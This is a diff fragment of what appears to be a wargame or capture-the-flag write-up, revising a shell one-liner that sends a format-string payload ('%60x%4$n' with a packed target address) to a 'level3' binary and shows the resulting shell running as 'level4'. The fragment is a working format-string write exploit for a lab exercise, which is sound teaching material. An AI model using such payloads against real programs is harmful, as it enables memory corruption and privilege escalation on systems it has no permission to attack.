@@ -147,10 +147,10 @@ The %n modifiers writes the length of the preceding formatted input. So if we wa
 ```sh
 ADDRESS="0804988c"
 BYTES=$(<<< "$ADDRESS" rev | dd conv=swab | xxd -r -p)
-(echo "$BYTES%p%p%45p%n"; cat) | ./level3
+(echo "$BYTES%60x%4\$n"; cat) | ./level3
 ```
 ```
-0x2000xb7fd1ac0                                   0xb7ff37d0
+                                                         200
 Wait what?!
 whoami
 level4
